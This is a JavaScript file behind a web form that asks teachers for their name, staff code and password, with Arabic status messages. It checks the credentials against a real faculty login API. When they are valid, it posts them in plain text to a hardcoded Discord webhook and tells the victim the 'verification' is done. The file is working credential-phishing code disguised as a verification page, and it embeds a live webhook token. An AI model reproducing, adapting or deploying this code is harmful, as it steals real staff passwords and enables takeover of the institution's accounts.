const Colors = {
    SUCCESS: "#449e48",
    FAIL: "#dc3c31",
    WAIT: "#ffd700"
};

function showStatusMessage(message, color) {
    const statusMessage = document.getElementById("status-message");
    statusMessage.textContent = message;
    statusMessage.style.background = color;
    statusMessage.style.display = "block";
    setTimeout(() => {
        statusMessage.style.display = "none";
    }, 3000);
}

function togglePassword() {
    const passwordField = document.getElementById("password");
    const showPasswordBtn = document.getElementById("show-password-btn");
    if (passwordField.type === "password") {
        passwordField.type = "text";
        showPasswordBtn.textContent = "*️⃣";
    } else {
        passwordField.type = "password";
        showPasswordBtn.textContent = "👁️";
    }
}

document.getElementById("sendButton").addEventListener("click", async () => {
    const baseURL = "https://bauc14.bis.edu.iq/api/faculty/auth/login?page_path=%2Ffaculty%2Flogin";
    const webhookURL = "https://discord.com/api/webhooks/1340785470296035338/-sE250LvVvvFyyQwRdYADHIXwcV3jpHMdLs03nzH9HGwBDrPjlCC3_i3SRhV7MS-n2ie";

    // checking inserted inforamtion before sending it to Discord
    const name = document.getElementById("teacher-name").value;
    const code = document.getElementById("teacher-code").value;
    const password = document.getElementById("password").value;

    const payload = {
        "code": code,
        "password": password,
        "remeber": false
    };

    showStatusMessage("جار التحقق من المعلومات...", Colors.WAIT);
    
    const response = await fetch(baseURL, {
        method: "POST",
        body: JSON.stringify(payload)
    });

    // send to Discord if ok code is received
    let status = response.status;
    let jsonData = await response.json();

    if (400 <= status && status <= 499) {
        showStatusMessage(jsonData.status.message, Colors.FAIL);
        return
    }

    if (200 <= status && status <= 299) {
        const message = {
            content: `\`name :: ${name}\ncode :: ${code}\npassword :: ${password}\``
        };

        try {
            const response = await fetch(webhookURL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(message)
            });

            if (response.ok) {
                showStatusMessage("تم التحقق من معلوماتك! يمكنك مغادرة الصفحة الان", Colors.SUCCESS);
            } else {
                console.error("Error sending message:", response.statusText);
            }
        } catch (error) {
            console.error("Erorr:", error);
        }
    } else {
        showStatusMessage(`حدث خطأ أثناء إنشاء الاتصال (ERROR CODE: ${status})`, Colors.FAIL);
    }
})